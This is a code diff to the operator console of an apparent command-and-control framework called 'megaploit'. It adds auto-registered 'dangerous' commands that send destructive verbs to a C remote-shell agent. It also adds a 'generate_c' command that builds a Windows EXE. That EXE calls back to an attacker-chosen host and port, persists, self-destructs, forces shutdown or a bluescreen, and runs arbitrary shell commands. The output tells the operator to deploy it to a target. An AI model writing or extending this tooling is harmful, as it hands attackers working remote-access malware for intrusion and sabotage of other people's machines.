@@ -612,6 +612,65 @@ def cmd_forkbomb(session: Session, args: list[str]) -> CommandResult:
 
 
 # ---------------------------------------------------------------------------
+# C-exclusive command auto-registration
+# ---------------------------------------------------------------------------
+# c_probe.c_exclusive_verbs() scans the C source for strncmp() dispatch verbs
+# that have no Python-agent counterpart and registers an operator command for
+# each one automatically.  No verb names or wire strings are hardcoded here —
+# adding a new strncmp("myVerb()", …) in shell.c is all that's needed.
+# ---------------------------------------------------------------------------
+
+def _register_c_exclusive_cmds() -> None:
+    """
+    Read C-exclusive verbs from the source tree and register a command for
+    each one.  Called once at module import time.
+
+    Each generated command:
+      - Sends the exact wire string the C client dispatches on
+      - Is marked dangerous=True (all C-exclusive verbs are destructive)
+      - Does NOT expect a response (C client acts immediately and may crash)
+    """
+    try:
+        from megaploit.core.c_probe import c_exclusive_verbs as _cev
+        here   = os.path.dirname(os.path.abspath(__file__))
+        c_root = os.path.normpath(os.path.join(here, "..", "..", "C-remote-shell"))
+        verbs  = _cev(c_root)
+    except Exception:
+        return
+
+    for wire_verb in verbs:
+        # Derive a clean operator-facing name: lowercase, strip "()" and spaces
+        cmd_name = wire_verb.rstrip("() ").lower()
+
+        # Avoid re-registering if something already claimed this name
+        if cmd_name in _registry:
+            continue
+
+        # Capture wire_verb in the closure by default-argument binding
+        def _make_handler(verb: str) -> object:
+            def _handler(session: Session, args: list[str]) -> CommandResult:
+                send_msg(session.conn, verb)
+                return CommandResult(
+                    ok=True,
+                    output=f"[*] {verb} sent to C-agent.",
+                    close_session=True,
+                )
+            _handler.__name__ = f"cmd_{verb.rstrip('() ').lower()}"
+            return _handler
+
+        _registry[cmd_name] = _CommandDef(
+            name=cmd_name,
+            usage=cmd_name,
+            help_text=f"[C-agent] Send '{wire_verb}' verb (auto-detected from C source)",
+            dangerous=True,
+            handler=_make_handler(wire_verb),
+        )
+
+
+_register_c_exclusive_cmds()
+
+
+# ---------------------------------------------------------------------------
 # Process & network intelligence
 # ---------------------------------------------------------------------------
 
@@ -1157,6 +1216,94 @@ def cmd_notes(session: Session, args: list[str]) -> CommandResult:
     with open(notes_path, "r", encoding="utf-8") as fh:
         content = fh.read()
     return _ok(content if content.strip() else "[*] Notes file is empty")
+
+
+# ---------------------------------------------------------------------------
+# C-remote-shell payload generation
+# ---------------------------------------------------------------------------
+
+@_cmd("generate_c",
+      usage="generate_c <lhost> <lport> [output_path]",
+      help_text="Build a C-remote-shell Windows EXE using the current session's secret key")
+def cmd_generate_c(session: Session, args: list[str]) -> CommandResult:
+    """
+    Compile the C-remote-shell client into a Windows EXE, embedding the
+    current secret key, lhost, and lport directly into the binary.
+
+    The resulting EXE:
+      - Connects back to <lhost>:<lport>
+      - Speaks full Megaploit TLS 1.2/1.3 + HMAC-SHA256 + AES-GCM protocol
+      - Supports: exit, sysinfo, cd, upload, download, persist, self_destruct,
+                  forceoff, bluescreen, and all shell commands via _popen()
+
+    Requires cl.exe (MSVC) or x86_64-w64-mingw32-gcc (MinGW) in PATH.
+
+    Examples:
+      generate_c 10.0.0.1 4444
+      generate_c 10.0.0.1 4444 /tmp/agent.exe
+    """
+    if len(args) < 2:
+        return _err("Usage: generate_c <lhost> <lport> [output_path]")
+
+    lhost = args[0]
+    try:
+        lport = int(args[1])
+    except ValueError:
+        return _err("[-] lport must be an integer")
+
+    output_path = args[2] if len(args) >= 3 else ""
+
+    try:
+        from megaploit.payload.builder import builder, BuildConfig, OutputFormat
+        from megaploit.core.crypto import load_key
+        from megaploit.core.c_probe import probe, format_report
+    except ImportError as e:
+        return _err(f"[-] Import error: {e}")
+
+    # ── Run C2 compliance probe on the source tree before building ─────────
+    here    = os.path.dirname(os.path.abspath(__file__))
+    c_root  = os.path.normpath(os.path.join(here, "..", "..", "C-remote-shell"))
+    probe_lines = ""
+    if os.path.isdir(c_root):
+        pr = probe(c_root)
+        probe_lines = format_report(pr)
+        if not pr.compliant:
+            # Show the report and refuse to build
+            return _err(
+                "[-] C source tree failed C2 compliance probe — "
+                "build aborted.\n" + probe_lines
+            )
+
+    # Load the shared secret so the generated binary authenticates correctly
+    try:
+        secret_key = load_key("secret.key")
+    except SystemExit:
+        return _err("[-] secret.key not found — generate one first")
+
+    cfg = BuildConfig(
+        lhost=lhost,
+        lport=lport,
+        format=OutputFormat.C_EXE,
+        use_tls=True,
+        secret_key=secret_key,
+        output_path=output_path,
+        name="megaploit_c_agent",
+    )
+
+    result = builder.build(cfg)
+    if not result.ok:
+        return _err(f"[-] Build failed: {result.error}")
+
+    _audit(session, f"generate_c {lhost}:{lport}", True)
+    return _ok(
+        probe_lines
+        + f"[+] C-agent built: {result.output_path}\n"
+        f"    Size:   {result.size:,} bytes\n"
+        f"    SHA256: {result.sha256}\n"
+        f"    Time:   {result.build_time_s:.1f}s\n"
+        f"\n"
+        f"    Deploy to target and run — it will call back to {lhost}:{lport}"
+    )
 
 
 @_cmd("tag", usage="tag <label>",
